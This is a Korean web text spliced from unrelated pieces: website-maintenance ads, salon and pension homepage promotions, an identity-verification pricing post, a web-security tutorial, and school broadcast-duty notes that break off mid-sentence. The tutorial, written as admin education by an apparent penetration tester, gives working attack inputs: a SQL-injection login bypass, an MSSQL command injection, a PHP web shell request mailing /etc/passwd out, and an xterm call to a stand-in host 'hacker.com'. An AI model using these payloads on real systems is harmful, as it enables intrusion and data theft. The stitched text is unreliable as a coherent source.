업체가 인터넷 상에서 본인들을 대표할 수 있는 효과적인 수단이기 때문에 브랜드의 신뢰감을 높이고 긍정적 이미지를 구축하기 위해 반드시 필요한 부분입니다.​최근에는 홈페이지 제작 의뢰와 함께 홈페이지 관리에 대한 문의도 계속해서 들어오고 있습니다. 대부분 제작과 관리를 전부 맡아줄 업체를 구하시거나 홈페이지 제작을 했으나 추후 업체의 유지보수 등이 마음에 들지 않아 새로운 업체에게 일을 의뢰하려 하시는 분들이 많으신데요. 홈페이지는 제작만큼이나 관리가 중요하기 때문에 확실한 유지보수를 약속하는 업체에게 일을 맡기시길 바랍니다. 또한 본인이 원하는 홈페이지를 만들 수 있는 실력있는 업체인지 또한 확인하셔야겠습니다.​  홈페이지 관리업체, 꼭 필요할까? 다산 커뮤니케이션실제로 홈페이지 제작을 의뢰하시는 분들 중에 '관리업체가 꼭 필요한가요'라고 질문하시는 경우도 많습니다. 시간이 지남에 따라 홈페이지 기능에 이상이 발견되는 경우도 있고 필요한 기능의 추가나 삭제가 필요한 일이 발생하기 때문에 관리를 확실히 약속할 수 있는 업체에게 홈페이지 제작을 의뢰하셔야 합니다. 대체로 피드백이 원활하지 않은 업체에 대한 불만이 많은 편인데요. 저희 다산 커뮤니케이션의 고객님들도 저희 피드백 속도에 굉장히 만족하시는 걸 보면 정말 중요한 요소임이 틀림 없습니다.​또한 관리 업체를 선택하실 때는 고객님의 말을 설득하기보다는 차근차근히 이해하실 수 있도록 쉽게 설명하고 고객님의 의견에 귀를 기울이는 곳인지 체크하시기 바랍니다. 이런 역량이 부족한 업체의 경우 관리 측면에서도 고객님이 만족할 만할 성과를 내지 못할 가능성이 높습니다. 무엇보다도 고객님과 소통하려고 노력하는 업체여야만 좋은 결과를 낼 수 있으며 불쾌감 없는 이용이 가능합니다. ​홈페이지 관리, 선택이 아니라 필수입니다. 홈페이지 제작에 관심이 있으시거나 관리업체를 찾는 중이시라면 저희 다산 커뮤니케이션으로 연락주시기 바랍니다. 저희는 오랜 경험과 풍부한 노하우를 바탕으로 안정적인 홈페이지 관리를 약속드립니다. 아래 전화나 카톡을 통해 문의주시면 더욱 자세히 설명해드리겠습니다. 감사합니다.​ 우건빌딩서울특별시 강북구 덕릉로 114  홈페이지 관리업체 문의- 전화 : 1899-8109- 카톡 : https://open.kakao.com/o/sk8pAkVb 광고문의 주세요.#네이버파워링크 #키워드광고 #다산컴즈 #다산커뮤니케이션 #파워링크광고 #뉴웹커뮤니케이션open.kakao.com ​ 웹 마스터의 홈페이지 보안 관리 1. 목적 수많은 웹 서버들은 해킹의 위험에서 벗어나질 못한다. 어떠한 방화벽과 어떠한 IDS , 침입차단 시스템 등... 날고 기는 방지책을 세워도 웹 해킹에는 효과적으로 대처하지 못한다.그 이유는 무엇일까?웹 서비스는 80번 포트를 사용하는 아주 정상적인 서비스이며, 가장 많은 사용자를 확보할 수 있는 기회를 제공한다.요즘 같은 시대에 누가 텍스트 기반의 커뮤니티를 원하는가? 웹의 시대가 온것이다.결국 웹 서비스상에서 수많은 기능들을 제공해야 한다. 덕분에 보안상 취약점은 많아지기 마련이다.단순히 index.html 파일 하나 올려놓고 소개만 하는 웹 서비스는 관리할 필요가 없겠지만, 규모가 큰 홈페이지 사업을 하는 회사의 경우 관리자가 존재하여 모든 웹 파일들을 관리해야 할 필요가 있다. 결국 중앙 집중적인 관리 방식이 필요하며, 많은 해커-크래커들은 이런 부분을 노리기 마련이다.중앙 집중적인 관리방식은 필요하겠지만, 조금만 헛점이 보인다면 홈페이지의 모든 정보는 쓸모없어질 수도 있는 것이다.이것이 내가 강좌를 쓰는 이유이다. 많은 관리자들이 이 강좌를 보고 깨달은게 하나라도 있다면 좋겠다.그 동안 많은 모의해킹을 하면서 엄청나게 많은 유형의 웹 서버를 해킹했다. 언제나 그렇듯이 관리자권한을 획득하는게 목적이며, 대부분의 웹 서버 접근에 성공하였다. 대기업, 은행, 증권, 거래소, 보험, 카드회사 등등 엄청나게 큰 웹 사이트라고 해서 안전하지 않았다.여러 가지 보안상 취약한 유형이 있겠지만, 가장 빈번한 유형에 대해서 대책을 알려주겠다. 악용을 목적으로 이 강좌를 본다면 당신은 잘못생각하고 있는 것이다. 평생 죄짓고 사는 사람이 되지 않길 바란다. 이젠 누가 해킹한다고 하면 옛날처럼 우러러 보지 않는다. 정령 폼나는 해커가 되고 싶다면 유리해 강좌란에서 "폼나는 해커"로 검색하면 3편의 강좌가 존재한다. 꼭 읽어보고 폼나는 해커가 되길 바란다.아무리 서버 보안 패치와  방화벽, 침입탐지 시스템을 설치한다해도 관리자의 실수, 웹 어플리케이션의 취약함은 막아낼 수 없다. 이들을 막아낼 수 있는 방법은 몇가지 없다. 관리자의 교육, 모의해킹 서비스를 받는 것이다. 모의해킹 서비스는 돈이 들기 때문에 관리자의 교육으로 때우자!!!!! ( 모의해킹으로 돈벌어 먹지만... )   2. 문제점 2.1  중앙 집중적 관리방식  중앙 집중적인 관리 방식의 문제점은 관리자 권한을 우회하여 접근하는 방식에 취약하다는 것이다. 일반적으로 관리자의 로그인을 성공해야 관리자 디렉토리에 접근이 된다. 이렇게 관리자 권한으로 접근하려면 응당 관리자 아이디와 패스워드를 넣어도록 만든다.좀더 엄격한 홈페이지의 경우 관리자 패스워드를 알고 있어도 특정 IP가 아니면 접근 자체가 거부된다.  a)  인증 우회관리자 디렉토리를 유추하는 것이다. http://www.test.com/admin/ 혹은 /administrator, /homeadmin, /auth 등 충분히 유추가 가능한 디렉토리로 설정이 된다. /admin 디렉토리가 관리자 디렉토리임을 알아냈다면 50%는 해킹에 성공했다고 볼 수 있다. 웹 서버에서 directory indexing을 허용한다면 http://www.test.com/admin/을 익스플로러에 넣는 것만으로 디렉토리 내분의 파일들을 볼 수가 있는 것이다. 그렇게 된다면 관리자 권한의 많은 웹 파이들을 획득, 이용할 수가 있는 것이다.하지만 보통은 directory indexing을 허용하지 않는다. 이제 해커는 몇몇 있을 만한 파일들을 유추해본다. /admin/user.html , /admin/board.html , /admin/config.inc , /admin/download .....웹 파일을 작성할 때 관리자 페이지의 첫 로그인부분만 인증절차를 거치며 그 후에는 아무런 인증을 검사하지 않는게 대부분이다.즉, /admin/login.html 혹은 /admin/index.html 파일에서는 인증 절차 및 검사를 하지만 이외의 파일은 검사하지 않는다.해결책 : 관리자 권한의 모든 웹 파일은 실행시 인증 검사를 해야 한다. cgi프로그램이라 할지라도 모두 인증 검사는 필수다. b) 인증 통과아이디와 패스워드는 DB에 저장하는 것이 일반적이다. SQL Injection취약점이 가장많이 통용되는 부분이기도 하다. 아이디 패스워드를 입력받을 때 특수문자를 체크하지 않거나, 체크하더라도 자바스크립트 같은 것으로 체크한다면 해커는 쉽게 SQL Injection을 이용하여 인증에 성공할 수가 있다.Select * from DB from where password = 'Password' ;  이런 식으로 SQL문이 만들어진다면 해커는 Password입력시 다음과 같은 방법을 이용할 것이다.Password = ' or 'a'='a결국 SQL문은 다음과 같이 조합이 된다.Select * from DB from where password = '' or 'a'='a' ;해커는 SQL문을 이런식으로 충분히 인증을 통과할 수 있으며, 심지어는 SQL서버에 명령을 내릴 수도 있다.MSSQL 서버를 사용한다면 다음과 같은 방법으로 쉽게 DB서버 내부에 명령을 내릴 수 있다.Password = ';exec master..??_???shell 'dir c\ > c:\test.txt'--이런식의 SQL조합은 DB서버의 c드라이브에 dir c:\명령에 대한 결과값을 c:\test.txt 라는 파일에 저장시키는 것이다.이러한 취약점의 발견은 DB와 연동할 만한 부분의 입력에 특수문자를 넣어 DB에러가 나는지 확인해봄으로써 알 수가 있다.해결책 : 언제나 특수문자는 넣지 못하도록 설계해야 한다. c) 인증 방법인증 방법에 문제가 있을 수 있다. 간혹 인증 검사 부분을 웹 페이지의 마지막 부분에 추가하는 곳이 있다. 이런 경우 인터넷 익스플로러를 사용하여 파일을 읽는다면 인증창이 뜬다. 하지만 telnet이나 기타 웹 파일을 긁어오는 프로그램을 이용한다면 인증전까지의 내용들을 가져올 수 있다.  # telnet www.test.com 80Trying x.x.x.x...Connected to www.test.com.Escape character is '^]'.  GET /admin/admin_user_list.php HTTP/1.0<html><body bgcolor=black>...(중간생략)    <td>               id = admin_1 <br>    </td>    <td>            password = admin123 <br>    </td>(중간생략)<H1>Forbidden</H1>You don't have permission to access<p><HR></body></html>Connection closed by foreign host. 위의 예제와 같이 인증하기 전 부분의 내용을 얻을 수 있으며 인증부분에서는 에러가 나는 것을 볼 수 있다. 이러한 방법으로 관리자 권한의 패스워드를 획득하거나 인수를 주어 관리자 명령을 내릴 수도 있는 것이다.해결책 : 인증검사 부분은 언제나 헤더에 넣도록 한다.  2.2 게시판 취약점 웹 서비스를 함에 있어 가장 골치덩어리는 자료실이다. 언제나 자료실은 관리의 핵심이며, 관리자가 유심히 지켜보아야 할 부분이다.그동안 엄청나게 많은 종류의 자료실 공격 방법이 공개가 되었고, 현재도 누군가 새로운 공격을 시도하고 있는지 모른다.크게 자료실(게시판) 자체의 취약점과 cgi의 업로드가 문제가 된다. a) 게시판 문제php 게시판의 경우 많은 문제점을 가지고 있다. php의 특성상 url에서 입력받은 인수를 php내부에 직접 인수로써 전달이 되는 문제점으로 너무나 쉽게 관리자 권한을 획득하거나 설정을 바꾸거나 열람할 수가 있다. 심지어 서버 내부에 있는 파일을 게시판에 업로드 할 수도 있는 극악의 취약점을 가지고 있기도 하다. 관리자 권한으로 접근하려면 login과정을 넘어야 하겠지만, 인수에 admin=1 이라는 것을 넣게되면 admin=1 이라는 내부 변수로 받아 간혹 admin접근을 허용하기도 한다. 게시판 설계를 어떻게 했냐에 따라 다르지만, 예전의 수많은 게시판들은 이러한 취약점에 노출되어있다. 해결책 : 게시판은 언제나 공인된 것을 사용하기 바란다. 게시판(자료실)은 민감한 부분이기 때문에 보안 프로그래밍에 자신이 없는 개발자라면 공인된 게시판을 사용하고 다른 일을 하는게 좋다. 그리고 php기반의 게시판은 피하는게 좋다. b) 자료실 문제해커의 cgi 의 업로드는 자료실운영을 악용한 것이다.서버에서 실행가능한 스크립트를 올림으로써 간단히 서버 내부에 명령을 수행할 수 있다. PHP,PERL,CGI,shtml 등의 스크립트들은 c언어의 system()처럼 서버내부에 명령을 내릴 수 있는 방법이 존재한다. php 의 경우 다음과 같은 간단한 내용으로 서버 내부에 명령을 실행할 수 있다. <?     `$command`?>http://www.test.com/download/hack.php?command="cat /etc/passwd | mail loveyou@www.test.com"  이러한 취약점을 막는 것은 여러 가지 방법이 존재한다.첫 번째,  파일을 저장하는 디렉토리에서 스크립트가 실행되지 않도록 웹 서버에서 설정한다.두 번째, 자료실에서 스크립트들의 업로드를 허용하지 않는다. 확장자를 필터링한다. ex) .asp .php .cgi .pl .shtml .html .htm .php3 .inc세 번째, 스크립트가 실행될 만한 웹 서버 모듈을 제거한다. 오로지 html 태그로만 홈페이지를 운영한다면 모든 스크립트의 모듈을 삭제한다. ex ) php, cgi, pl  2.3 X-Windows 취약점 cgi 파일 업로드나, 관리자 권한의 접속시 서버 내부에 명령을 내릴 수 있는 권한이 생긴다. 하지만 웹 서비스를 이용하여 서버내부에 명령을 내려봐야 일회용 명령뿐이다. 결국 해커는 다음과 같이 xterm이나 shelltool같은 x-terminal프로그램을 이용하여 해커의 서버에 띄우는기를 시도한다.http://www.test.com/download/hack.php?command="/usr/X11R6/bin/xterm -display hacker.com:0"해결책 : 서버 내부에 존재하는 모든 x-windows 관련 프로그램은 root권한 혹은 관리자만 접근이 가능하도록 설정을 해야 하며, 서버 내부에서 외부 서버 6000~7000번포트로의 접근을 방화벽에서 통제해야 한다. 2.4 백업, data 파일의 존재 웹 어플리케이션을 작성하다보면 간혹 이전 파일의 백업을 위해 web_file.asp.bak 와 같이 저장하는 경우가 허다하다. 결국 web_file.asp 스크립트의 소스는 백업 파일을 통해 볼 수가 있는 것이다.해커들은 언제나 백업파일을 알아낼 수 있는 툴을 만들어 놓는다. 예를 들어 홈페이지 전체를 긁어 모아서 스크립트 파일의 확장자에 .bak .org를 붙여서 검사해보기도 한다. 또다른 유형으로는 user.dat, user.mdb 와 같이 DB가 아닌 파일에 정보를 저장하는 경우도 있다. 극히 드물긴하지만 외부에서 쉽게 다운로드할 수 있기 때문에 심각한 문제가 될 수 있다. 특히 directory indexing이 되는 경우 쉽게 파일명을 알아낼 수 있다.윈도우즈용 ftp프로그램인 WS FTP 프로그램을 이용하게 되면 서버 디렉토리에 WS_FTP.LOG라는 파일이 생성되어 어떠한 파일들이 어디서 업로드 되어있는지 알아낼 수 있다.http://www.test.com/WS_FTP.LOG해결책 : 백업파일 관리는 언제나 충실해야 한다. 웹 서비스중인 디렉토리에 동시에 존재해서는 안된다. 다음과 같이 find 명령으로 언제나 백업파일을 찾아 /backup 디렉토리로 옮기자.find /web_home -name "*.bak" -o -name "*.org" -o name "WS_FTP.LOG" -exec mv {} /backup \;  2.5 인증 접근 IP 우회 웹 마스터의 인증을 위해서는 특정 IP로만 접근이 허용될 때 사용하는 방법이다.단지 외부에서의 admin 디렉토리 접근을 막았다면 대상 서버의 proxy 서버를 찾아내어 이용하면 그만이다. 리눅스의 경우 proxy 서버가 디폴트로 설치되는 경우가 있다. 해결책 : proxy서버를 사용하지 않는다.  2.6 디폴트 CGI 존재 설치한지 오래된 웹 서버의 경우 /cgi-bin/ 디렉토리에 각종 cgi 파일들이 존재한다. 사용하지 않는다면 디폴트로 설치된 cgi프로그램들은 삭제해야 한다.  2.7 취약한 웹 서버들 웹 서버가 오래된 버전이라면 안전하지 않다. 다음의 웹 서버들은 사용하지 않거나 그 이상의 버전으로 업그레이드 해야 한다. Netscape Enterprise WebServer 4.1 Service Pack 7Tomcat v4.0.3 & Apache WebServerResin 2.1.2ServletExec 4.1 ISAPI / IIS 4 & 5Weblogic v6.1 Service Pack 2 Jrun 4.0 Apache 2.x대에서 2.0.39 Apache 1.3.24PHP 4.1.0 & Apache WebServerMod_ssl 2.4.9 & Apache WebServer   피부,헤어,네일,메이크업,속눈썹고개관리프로그램 스마트쌤 홈페이지가 업데이트 되었습니다^^ 속눈썹 회원님들을 위한 따끈한 속눈썹 홈페이지!!﻿ 상큼한 핑크톤의 홈페이지네요~ 속눈썹 하시는 원장님들 많은 이용 부탁 드립니다.스킨은 클릭 한번으로 변경 가능하오니 한번 적용해 보세요^^  ﻿ 홈페이지관리 → 스킨선택 → 스킨 클릭!!     홈페이지, 쇼핑몰, 포털 등  다양한 웹사이트에서실명인증이나 성인인증을 하기 위해 휴대폰 본인확인서비스를 이용하고 있는데요.​ 많은 중소 쇼핑몰과 홈페이지에서 인증 건수에 비해 필요 이상의 비용을 지불하고본인인증 서비스를 사용하고 있습니다.​홈페이지관리에 지출되는 비용 중 실명인증성인인증 서비스에 너무 많이 돈이 낭비되고 있다고 생각이 드시는 분은 이 글을 끝가지 읽어 보시길 바랍니다.​아마 비용을 줄이는데 많은 도움을 될 것입니다.​​ 휴대폰 본인확인 서비스​​혹시 본인인증 서비스를 월정액제로 이용하고 계시나요?​​홈페이지에 매월 발생하는 휴대폰본인인증건수가400건 이하로 실명인증을 사용한다면이용하는 서비스 종류나 형태에 따라최소 연 6만원부터 많게는 40만원 이상까지 비용을 절감을 할 수 있습니다.​대부분 홈페이지 관리 업체에서고객 웹사이트를 관리하며 이러한 부분까지디테일하게 확인해 주기가 어렵다 보니무심코 비용 손실이 발생하게 됩니다.​만약 휴대폰 본인확인서비스 업체에월 정액제로 신청하여 이용하고 있을 경우월 사용건수가 많지 않다면 건별로 사용하는 것보다 비용 손실이 수십배까지 발생합니다.​단순히 단가로만 계산할 때에는 휴대폰 본인확인 건당 가격이 더 저렴하지만,홈페이지에 사용하는 본인인증 건수가 적다면 오히려 훨씬 많은 손실이 생깁니다.​ ​다음은 휴대폰 본인확인서비스 업체에서현재 정액제로 제공하는 이용 가능한 상품 종류 중서비스 요금이 가장 저렴한 가격을 기준으로예를 들어 설명한 내용이니 읽어보시면이해가 쉽게 올 것입니다.​ 정액제로 매월 25,000원에 500건 본인인증 이용1건당 50원의 비용 발생, 미사용 건수 소멸이 요금의 경우 500건 내외의 본인인증 건수가발생한다면 비용 손실이 거의 없습니다.​하지만, 홈페이지에 매월 본인인증 사용 건수가 약 100건 내외라면 어떻게 될까요?​실사용 비용: 100건 x 50원 = 5,000원​매월 500건이 무료 제공되지만 실제로 사용한 비용은 5천원이 되고2만원은 소멸되어 손실되는 비용이 발생합니다.​​이처럼 실사용건수가 적은 경우에는 건당 100원을 지불하더라도 건별로 계약하는 것이 훨씬 유리합니다.​건당 100원 계산 비용: 100건 x 100원 = 10,000원​아주 비싼 과장된 비용으로 건별 계산을 하더라도15,000원의 비용 절감이 발생합니다.​이것을 1년으로 계산하면 180,000원이나 됩니다.​18만원이라는 비용은 홈페이지 관리로 1년 웹호스팅과 도메인 비용 + SSL 보안인증서까지 사용하고도 남는 돈입니다.​ 정액제로 매월 50,000원에 1200건 본인인증 이용1건당 약 42원의 비용 발생, 미사용 건수 소멸이 요금의 경우 실명인증, 성인인증이 빈번하게자주 발생하는 중형 이상의 사이트에서 이용한다면비용적인 면에서 확실히 이득이 됩니다.​하지만, 잘 모르고 성인인증이나 실명인증이 필요해서비스 업체를 찾다 가입하는 경우도 있습니다. 이런 경우 월 200건 사용을 가정하고 계산하면​실사용 비용: 200건 x 42원 = 8,400원​매월 1200건이 무료 제공되지만 실제 사용 비용은 8천4백원이 발생하고약 4만1천원가량은 소멸되어 사라집니다.​이번에도 위에서 예로 들었던 것 처럼 실명인증 건당 100원의 조건으로 가입했다는 가정하에 계산을 해보겠습니다.​건당 100원 계산 비용: 200건 x 100원 = 20,000원​높은 비용으로 가정한 건별 계산에서도30,000원의 이득이 발생합니다.​이것을 1년으로 계산하면 360,000원이 됩니다.​​위의 예들은 과장이 아닌 실제 일어나고 있으며모르는 분들도 많이 있습니다.​​본인확인 서비스를 제공하는 업체들을 살펴보면 월 정액제로만 서비스를 제공하는 곳도 있고 건별로 제공하는 업체도 있습니다.​특정, 솔루션업체와 연결되어 있는 경우에는건별 계약을 할 수 없도록 조건이 되어있습니다.​즉, 잘 알려진 임대 쇼핑몰의 경우에는정액제로 묶여있는 경우가 많아서건별하는 본인인증서비스 계약을 할 수 없습니다.​​하지만, 독립형 쇼핑몰을 운영하는 경우라면사용 중인 서비스를 비교하여 본인인증서비스업체를변경한 후 홈페이지 관리 업체의 도움을 받아쇼핑몰에 적용한다면 다소 많은 비용절감을 할 수 있으니 확인해보시기 바랍니다. ​  다양한 경험과 노하우가 풍부한 IT전문가의 무료 상담만으로도 많은 시간과 비용을 절약할 수 있으니 도움이 필요한 분은 가볍게 노크하세요.​​ 홈페이지 독립형 쇼핑몰 유지보수 SEO 오류장애 문제해결홈페이지 독립몰의 차별화된 유지보수를 위해 SEO 검색엔진 최적화 및 오류 장애 문제해결, 컨설팅, IT전문가 동행서비스를 제공합니다.www.troubleshooting.co.kr ​​ 홈페이지제작, 홈페이지관리, 홈페이지수정블로그제작, 블로그관리, 블로그포스팅와짱홈페이지, 와짱블로그안녕하세요!​  ​홈페이지랑 블로그에 관심이 많아막상 업체를 알아보려면 수정이나 관리 등잘 되는지에 걱정이신 분들!​  ​홈페이지, 블로그 전문업체와짱에서 한번에 도와드립니다.​홈페이지로 인한 사기, 걱정 하실 필요없는 20년된 전문업체로써믿고 맡기실 수 있습니다!​  ​자세한 내용을 알고 싶으신 분은아래 오픈채팅방으로 문의주세요!▼▼▼ 홈페이지/블로그는 와짱👍님의 오픈프로필홈페이지/블로그 문의는 언제든지!open.kakao.com 웹사이트, 유지보수를 맡기자니 그렇고 그렇다고 그냥 두기에는 좀 ... 비용때문에 어떻게 할지 판단하기 어려우시죠?​홈페이지 유지보수, 나의 상황에 맞는 관리 방식을 선택한 비용절감  © helloquence, 출처 Unsplash ​홈페이지 관리가 고민이라면 이렇게 하세요.​홈페이지를 구축하여 운영을 하다 보면 특별하게 관리를 할 필요가 없는 경우도 있지만 부득이하게 외부에 유지보수를 맡기거나 개별건으로 요청을 해야 하는 일이 발생합니다.​이러한 상황이 발생한다면 다음을 고려하여 자신에게 적합한 방식을 선택한다면 보다 저렴한 비용에 효율적인 관리가 가능합니다.​ 재능마켓이나 홈페이지 제작업체 건별유지보수 이용하기 © johnschno, 출처 Unsplash ​단순하게 텍스트와 이미지, 게시판으로 이루어진 홈페이지의 경우 정기적인 유지보수를 하는 것이 괜히 비용 낭비라는 생각을 하게 됩니다. ​이럴 때에는 필요에 따라서 재능마켓이나 홈페이지 제작업체의 건별 유지보수를 활용하는 것이 좋습니다.​내가 수정을 원하는 항목에 책정된 작업 비용만 지급하면 되기 때문에 좀 비싸게 느껴질 수 있지만, 계속해서 발생하는 비용이 아니다보니 부담이 덜 느껴질 수 있습니다.​정말, 1년에 2 ~ 3번 정도 단순 수정이나 변경작업이 필요하다면 가장 현명한 선택이 됩니다.​하지만, 이러한 작업이 일정 횟수를 넘어가면 정기유지보수보다도 훨씬 비싸게 작업하는 결과를 가져오므로 잘 생각해보아야 합니다.​홈페이지 업체에 따라서 월 3 ~ 5만원 정도의 아주 저렴한 가격에 정기적인 관리를 해주는 업체들도 상당히 많이 존재합니다.​굳이 중요한 홈페이지가 아니라면 이러한 홈페이지 업체를 이용하는 것도 좋은 대안이 될 수 있습니다.​ 홈페이지 제작업체의 정기유지보수 이용하기 © carlheyerdahl, 출처 Unsplash ​대부분 홈페이지 제작 업체의 정기유지보수는 아래 기준으로 유지보수비용을 책정합니다.​텍스트/HTML 수정 횟수, 페이지 추가 횟수이미지 수정/교체 횟수팝업/배너/서브페이지 제작 횟수메인 디자인 변경 등*프로그램 유지보수/기능 추가 별도비용​위의 항목에 대해 월간 제공하는 서비스 횟수에 따라 유지보수 형태(종류)가 나누어집니다.​유지보수 비용은 월간 서비스 제공 횟수에 따라 적게는 3~5만원에서 많게는 50만원이 넘는 가격이 소요되게 됩니다.​가장 저렴한 유지보수 종류를 선택할 경우, 항목별 1~2회의 서비스를 제공하다 보니 큰 메리트는 없다고 볼 수 있는데요.​동일한 건수로 비용을 계산해보면 개별 건으로 작업을 요청하는 것보다는 약 2배 이상 차이가 나기 때문에 정기적으로 관리가 필요한 경우에는 건별 유지보수보다 유리하다고 볼 수 있습니다.​ 단독 서버 독립형 웹사이트SI업체 정기유지보수 이용하기 © kreatikar, 출처 Pixabay ​위와 같이 정해진 틀안에서 이루어지는 홈페이지 유지보수가 적합하지 않은 프로그램 관리와 백업, 복구 등이 필요한 웹사이트의 경우에는 SI업체를 통한 유지보수가 리스크 관리 차원에 더 좋습니다.​인터넷 검색을 통해서 나오는 일반 홈페이지 유지보수 업체를 이용하여 프로그램을 유지보수하는 것은오류나 장애 대응에 취약할 수 있습니다.​단독 서버를 사용하는 독립 쇼핑몰이나 부동산, 특정 서비스를 제공하는 비즈 플랫폼 사이트는 기본적으로 웹소스와 DB백업, 프로그램 오류수정, 장애에 대한 유지보수가 포함되어야 합니다.​서버 호스팅업체에 일정 비용을 지불하면 백업과 복구 서비스를 제공하지만 이들 업체는 프로그램 오류나 장애에 대해서는 서비스가 사실 어렵습니다.​  © mohamed_hassan, 출처 Pixabay ​백업과 복구서비스의 경우전문 유지보수업체에 함께 맡기는 것이 비용적인 측면에서나 관리적인 면에 있어서 더 유리하고 나은 선택이 됩니다.​따라서,이와 같은 홈페이지 관리, 유지보수는 홈페이지제작을 전문으로 하는 웹에이전시보다 기술력이 있는 SI업체에 맡기는 것이 좋습니다.​SI업체를 간단히 설명을 하자면, 정보시스템 구축하는 일 즉, 웹사이트를 구축함에 있어 서버, 네트워크, 프로그램 개발, 유지보수 등의 서비스를 두루 제공하는 업체라고 생각하시면 됩니다.​그간 경험상 유지보수 비용을 살펴보면, SI업체가 주로 관리하는 공공기관 홈페이지나 정보시스템의 경우일반 홈페이지 관리보다 비용이 다소 높습니다.​특별한 수정 작업이 없어도 매월 정기점검이나 단순 관리만으로 연 1천만원 이상 지불하는 곳이 대부분입니다.​그 이유는 평소 정기점검외에 큰 작업은 없지만 문제가 발생할 경우 책임을 지고 복구해야 하는 의무를 가지고 있다보니 유지보수는 하나의 보험과 같은 역할을 합니다.​공공기관에서 유지보수의 핵심은 홈페이지의 단순한 수정보다는, 만약의 사태를 대비한 백업과 장애 대응이 중요한 목적이라고 보면 맞을 것입니다.​하지만, 일반 기업이 보험으로 생각하고 수십만원의 유지보수 비용을 지불하기에는 다소 무리가 있고 그만한 규모나 가치가 있나고민해보지 않을 수 없는게 현실입니다.... ​자신의 상황에 맞는 유지보수 방식을 잘 선택하여 작은 비용이라도 절약할 수 있기를 바랍니다.​​ 안녕하세요.​솔라드 입니다.​​​며칠전 거제 와현해수욕장 앞에 있는 분홍대문펜션에 다녀왔어요.​펜션 인테리어 사진 촬영을 위해 방문했는데 같이 커피 마시며 이런저런 대화를 좀 오래 나눴답니다.​사실 제가 꿈꾸던 독채펜션이었거든요 ㅎㅎ​넘넘 감성 가득하고 센스 있는 인테리어를 보고 제가 반해버렸어요.​사진 촬영을 잘 마치고 사진을 보여드리면서 더 필요하신 사진은 있는지 ​이 사진들은 어떻게 편집해서 사용할지 등을 설명드리다가 홈페이지를 가급적 빨리 만들고 싶다고 하셔서​저와 인연이 되었습니다. 보통 서울 업체가 잘하겠지라는 생각만으로 맡기시기도 하는데​결국...홈페이지제작업체에 맡기시면 거기서 다시 저한테 사진촬영 대행 오더가 오고 그런 경우가 많아요.​괜히 비싸게 할 필요도 없거니와​무엇보다 자신이 운영하는 펜션에 직접 와보고 펜션의 특징을 알고 사진도 찍은 제게 홈페이지를 맡기고​싶다고 하셔서 저도 기분 좋았지만 참 현명하신 분이라는 생각도 들었습니다.​먼저 궁금해하실 홈페이지 메인 부터 보여드릴께요~ㅋㄷ​ ​어떤가요? 홈페이지 메인이 블로그라서 덜 와닿을수도 있는데​실제 모바일이나 pc로 접속해보면 화면 꽉차게 사진 예쁩니다 ㅋㄷ​거제펜션들 많지만 저희 홈페이지만큼 관리가 쉽게 제작된 곳도 드물것 같습니다.​ 예약안내문에 성수기, 비수기 기간 설정이나​숙박비용 설정이 아주 간단하게 관리자페이지에서 수정가능하여​펜션 사장님들이 직접 실시간으로 수정하실수도 있도록 제작해드렸습니다.​ 실시간예약하기 코너에는​달력을 보여주고 현재 예약 상황이 상세히 나타납니다.​그리고 또 중요한 기능은​고객이 예약을 했을 경우에​고객에게도, 사장님에게도 이메일과 문자메시지로 알림이 오기 때문에​일일히 신경쓰면서 수시로 홈페이지 접속 해볼 필요없이​편하게 사장님 업무 보시면 예약 들어올때마다 문자 띵동~옵니다 ㅋㄷ​참 반가운 문자지요.​ 또한 객실이나 외부 등 전경사진과 ​주변 관광지 설명 게시판도 잘 마련되어있고​여기에 사진을 올리거나 글쓰기도 쉽도록 만들어두어서​사장님들이 재밌게 직접 자신의 홈페이지를 꾸며가실수 있습니다.​아직도 홈페이지가 없는 펜션들도 있더라구요.​홈페이지가 있으면 나의 펜션에 대한 자부심과 애착도 생기고​무엇보다도 예약율이 높아집니다.​홈페이지를 가지고 있더라도 ​어떤 홈페이지냐에 따라 예약이 많이 들어올지도 달라집니다.​저희 솔라드는 펜션홈페이지 제작을 전문으로 하며​풍부한 사진촬영경험과 실력, 마케팅 노하우를 겸비하고 있습니다.​저와 만나신다면 블로그, 카페, 이벤트, 체험후기 등 다양한​온라인마케팅에 대한 상담을 무료로 해드리기도 하고​특히!!​이 블로그 포스팅 보신분은​견적 다 받고 나서​막판에 얘기해주셔도 됩니다.​펜션 홈페이지 제작비+방개수에 따라 디자인과 사진촬영비가 결정됩니다.​이러나 저러나 타업체의 반값수준으로 고퀄리티 홈페이지와 사진촬영 해드릴듯 합니다만​그래도 이 블로그 보신분...​말씀해주시면​드론항공사진 서비스~~~​시원하게 띄워드리겠습니다.​거제홈페이지 제작​경남홈페이지제작 망설이지 마시고 ​지금 바로 만드세요.​며칠전 제작해드린 홈페이지가 궁금하시다면​네이버에서 분홍대문펜션이라고 검색해보시구요.​혹시 이번 여름에 거제 와현해수욕장 여행 계획이 있으신분께는​꼭 추천드리고 싶은 예쁜 독채펜션입니다.​​아래 연락처는 홈페이지제작, 사진촬영업체입니다.​ ​​ * (3.5) 홈페이지 관련으로 오시는 분들이 많아, 내용을 더 추가하였습니다.​‼️이 글은 제가 근무하고 있는 학교를 기준으로 작성하였습니다. 지역, 학교마다 업무내용이나 처리기준은 다르게 적용될 수 있습니다. 참고용으로 보세요.‼️​​​  방송업무1. 첫 업무시작은 3/2 입학식 준비하기 - 애국가, 국민의례 등등... 음향 확인하기(방송실 방송기기에 저장되어 있기 때문에 누르기만 하면 됨) - 필요에 따라 빔프로젝터 설치​2. 창체시간 영상 틀어주기(경제교육, 다문화교육, 성폭력예방교육 등등) - 담당선생님께서 링크나 USB 주시면 틀어주기​3. 시청각 자료를 이용하는 행사, 교육 (재난, 민방위 훈련, 영어듣기평가 등) - 필요시 빔프로젝터, 마이크 준비하기 - 재난, 민방위 훈련은 시간 맞춰서 라디오 방송 틀어주면 됨(수업과 겹치면 시간표 변경요청) - 제일 신경써야하는게 영어듣기평가(수행평가에 반영되는 경우), 생방으로 진행되기 때문에 라디오(비추)나 반디프로그램, EBS홈페이지 온에어 등으로 틀어주면 됨. 전날 전체 교실 방송점검 - 체육대회 행사 준비(개회식, 준비운동 등), 마이크 준비, 음악방송(체육과 협의, 안하는 경우도 있음)​4. 방송반 동아리 운영 - 방송반 단톡을 활용하여 방송준비, 점검, 마무리 관리 - 3학년 방송반 학생들이 방송반 체계, 운영에 대해 잘 알고 있기 때문에 알아서 잘 운영해줬음, 교사는 방송반 운영 지도하고 방송반 건의사항 해결 - 점심시간 음악방송 ( 이것도 방송반 학생들이 알아서.. ) - 방송반이 얼마나 활성화 되어 있는지에 